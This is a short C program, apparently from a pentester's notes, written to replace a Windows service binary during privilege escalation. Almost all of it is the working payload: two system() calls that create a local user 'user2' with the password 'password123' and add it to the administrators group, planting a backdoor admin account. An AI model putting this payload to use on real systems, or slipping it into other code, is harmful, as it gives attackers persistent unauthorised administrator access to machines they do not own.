# Payload to create users, for some reason msfvenom don't work replacing service .exe bin, but this works:
=================================
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user user2 password123 /add");
  i = system ("net localgroup administrators user2 /add");
  
  return 0;
}
